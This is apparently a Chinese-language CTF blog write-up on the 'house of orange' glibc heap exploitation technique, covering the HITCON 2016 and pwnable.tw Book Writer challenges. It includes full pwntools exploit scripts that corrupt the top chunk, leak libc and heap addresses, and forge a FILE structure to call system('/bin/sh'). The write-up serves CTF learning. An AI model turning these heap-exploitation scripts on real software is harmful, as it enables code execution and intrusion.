---
title: house of orange
categories:
- HouseOfOrange
---
# house-of-orange专题总结

## 前言

最近在BUUCTF刷题，见到了house-of-orange真题，当时学的时候只是大概了解了原理，正好结合文件攻击总结一下

## 原理

house of orange 是一种堆利用手段，给的题目中没有free函数，攻击者可以通过覆写top chunk的size字段修改其为一个比较小的值，之后在malloc一个大于此值的chunk的时候让原top chunk进入unsorted bin，而原堆块通过brk或者mmap扩展，再从中分配堆块。通过这种方式可以让top chunk进入unsorted bin，从而间接free堆块。  

题目特征就是没有Free，需要有一个堆溢出的漏洞可以利用。构造的时候注意top_chunk_addr + fake_size要是0x1000对齐，一般把倒数第三个字节改成0x00即可

## Hitcon-CTF house of orange 

### 题目分析

题目一共有三个功能，Build、See和Upgrade分别对应Add、Show和Edit.

![menu](./1.jpg)

Build函数可以Build 4个堆块，最大可以分配的size为0x1000，每次先分配一个house_chunk，其中存储price_chunk和name_chunk，读取price、name和color

![build](./2.jpg)

![house](./3.jpg)

See函数可以打印出house的name和price和color等内容

![see](./4.jpg)

Upgrade有一个读取length并根据length编辑的溢出，溢出长度最多可达0x1000

![upgrade](./5.jpg)

### 漏洞利用

先分配一个堆块，利用Upgrade修改top chunk的size，再Malloc一个较大的堆块，使得top chunk进入unsorted bin。再Malloc一个large bin，从unsorted bin中切割出来，利用其bk泄露libc地址，再Upgrade这个large bin，可以用fd_next_size泄露heap地址。

再使用Upgrade溢出修改Unsorted bin，结构为：
"/bin/sh\x00"+p64(0x61)  
p64(0)+p64(_IO_list_all-0x10)  
p64(2)+p64(3)  
'\x00'*0xa8  
fake_vtable_addr

之后Malloc一个堆块的时候会触发unsorted bin attack，具体的原理在之前SCTF的easy heap中有介绍，最终去执行fake table的system函数，参数为fp的"/bin/sh\x00"  

### exp.py

```python
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./houseoforange_hitcon_2016')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./houseoforange_hitcon_2016')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20044)

def Build(size,name,price,color):
    p.recvuntil('choice : ')
    p.sendline('1')
    p.recvuntil("Length of name :")
    p.sendline(str(size))
    p.recvuntil("Name :")
    p.send(name)
    p.recvuntil("Price of Orange:")
    p.sendline(str(price))
    p.recvuntil('Color of Orange:')
    p.sendline(str(color))

def See():
    p.recvuntil('choice : ')
    p.sendline('2')

def Upgrade(size,name,price,color):
    p.recvuntil('choice : ')
    p.sendline('3')
    p.recvuntil("Length of name :")
    p.sendline(str(size))
    p.recvuntil("Name:")
    p.send(name)
    p.recvuntil("Price of Orange: ")
    p.sendline(str(price))
    p.recvuntil('Color of Orange:')
    p.sendline(str(color))


def exp():
    #leak libc
    Build(0x18,'a'*8,1,1)#1
    Upgrade(0x40,'a'*0x10+p64(0)+p64(0x21)+p32(1)+p32(0x1f)+p64(0)*2+p64(0xfa1),1,1)#1
    Build(0x1000,'b'*8,2,2)#2
    #get unsorted bin
    #leak libc
    Build(0x400,'a'*8,1,1)#3
    See()
    p.recvuntil('Name of house : aaaaaaaa')
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 1640 - libc_offset
    log.success('libc base => ' + hex(libc_base))
    system_addr = libc_base + libc.symbols['system']
    shell_addr = libc_base + gadgets[3]
    io_list_all = libc_base + 0x3c5520
    #leak heap
    Upgrade(0x20,'a'*0x10,1,1)#2
    See()
    p.recvuntil('Name of house : aaaaaaaaaaaaaaaa')
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0xc0
    log.success('heap base => ' + hex(heap_base))
    #unsorted bin attack

    #Build(0x50,p64(shell_addr)*10,1,1)#4
    payload = p64(system_addr)*10
    payload = payload.ljust(0x400,'\x00')
    payload += p64(0)+p64(0x21)+p32(1)+p32(0x1f)+p64(0)+"/bin/sh\x00"+p64(0x61)+p64(0)+p64(io_list_all-0x10)
    payload += p64(2)+p64(3)+'\x00'*0xa8
    payload += p64(heap_base+0xd0)
    Upgrade(0x10000,payload,2,2)#2

    #gdb.attach(p)
    p.recvuntil('choice : ')
    p.sendline('1')


    p.interactive()

exp()
```

## pwnable.tw Book Writer

### 程序逻辑

程序有4个功能，Add、View、Edit和Info

![menu](./6.jpg)

Add可以添加9个chunk，0x6020a0为chunk_list，0x6020e0为chunk_size_list，注意添加chunk的条件是i>8且chunk_list[i]不为NULL，我们的chunk[8]=chunk_size[0]，从而得到一个可读size超大的堆。

![Add](./7.jpg)

View可以查看堆内容

![view](./8.jpg)

Edit根据size的大小读取数据，并更新新的size为strlen(content)，这里也有漏洞，当分配0x18的堆块并填充0x18时，content会跟下一个堆块的size连上，strlen的大小会包含size的部分。

![edit](./9.jpg)

Info函数可以修改author的值，最多可以读取0x40大小，而get_input函数没有给末尾强制加'\x00'，在chunk_list有值之后再修改author可以泄露堆地址。

![info](./10.jpg)

![author](./11.jpg)

### 漏洞利用

先利用Edit的溢出漏洞进行house of orange攻击，修改top chunk的size，得到一个Unsorted bin，分配一个large bin,用它泄露堆地址和lib基址(这里其实应该用author那个泄露堆地址，分配large bin的话后面要发送的数据量就太大了)。  
分配8个堆块，从而可以覆写chunk_list[0]，构造fake_file和fake_vtable，因为是根据strlen的结果修改size_list，我们可以发送数据的前面是'\x00'，这样就会让chunk_size_list[0]被改为0，从而可以malloc一个堆块，最后触发system("/bin/sh\x00")拿到shell。  
exp本地可以，远程失败，原因是刚提到的数据量的问题，懒得改了。

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./bookwriter')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./bookwriter')

else:
    libc = ELF('./libc_64.so.6')
    libc_offset = 0x3c3b20
    p = remote('chall.pwnable.tw',10304)

def Add(size,content):
    p.recvuntil('choice :')
    p.sendline('1')
    p.recvuntil("Size of page :")
    p.sendline(str(size))
    p.recvuntil("Content :")
    p.send(content)

def View(index):
    p.recvuntil('choice :')
    p.sendline('2')
    p.recvuntil("Index of page :")
    p.sendline(str(index))

def Edit(index,content):
    p.recvuntil('choice :')
    p.sendline('3')
    p.recvuntil("Index of page :")
    p.sendline(str(index))
    p.recvuntil("Content:")
    p.send(content)

def exp():
    #leak libc
    p.recvuntil('Author :')
    p.sendline('xmzyshypnc')
    p.recvuntil('choice :')
    p.sendline('1')
    p.recvuntil("Size of page :")
    p.sendline(str(0))#0
    Add(0x18,'a'*0x18)#1
    Edit(1,'b'*0x18)
    Edit(1,'c'*0x18+'\xc1\x0f\x00')
    Add(0x1000,'d'*8)#2
    Add(0x400,'a'*8)#3
    View(3)
    p.recvuntil('Content :\n')
    p.recvuntil('a'*8)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 1640 - libc_offset
    log.success('libc base => ' + hex(libc_base))
    raw_input()
    system_addr = libc_base + libc.symbols['system']
    io_list_all = libc_base + 0x3c5520
    #leak heap
    Edit(3,'d'*0x10)
    View(3)

    p.recvuntil('Content :\n')
    p.recvuntil('d'*0x10)
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x40
    log.success('heap base => ' + hex(heap_base))
    raw_input()
    #overwrite the unsorted bin
    Add(0x38,'a')#4

    fake_file  = "/bin/sh\x00"+p64(0x61)+p64(0)+p64(io_list_all-0x10)
    fake_file  += p64(2)+p64(3)+'\x00'*0xa8
    fake_file  += p64(heap_base+0x470)
    #Edit(3,fake_file)
    #Edit(3,'B'*0X70+'/bin/sh\x00'+'\x61')
    Add(0x10,'a')#5
    Add(0x10,'a')#6
    Add(0x10,'a')#7
    Add(0x10,'b')#8
    payload = '\x00'*0x10+p64(0)+p64(0x21)+'a'*0x18+p64(0x411)
    payload += 'a'*0x400
    payload += p64(0)+p64(0x81)
    payload += p64(system_addr)*0xc
    payload += (p64(0)+p64(0x21)+'a'*0x10)*2+p64(0)+p64(0x21)
    payload += fake_file
    Edit(0,payload)
    gdb.attach(p)
    p.recvuntil('choice :')
    p.sendline('1')
    p.recvuntil("Size of page :")
    p.sendline(str(0))#0

    p.interactive()

exp()

```

## 后言

看p4nda师傅看雪的一篇帖子提到HCTF 2017 有道baby printf也用到了house of orange，且不需要泄露heap地址，直接从libc中找fake vtable，在构造fake file的时候对应偏移修改system地址及参数地址即可，这个方法我尝试在book writer复现，但是libc中没找到所说的vtable，在libc 2.24中找到了，以后需要再搞吧，这里给个链接。

[s1mple](https://bbs.pediy.com/thread-222735.htm)
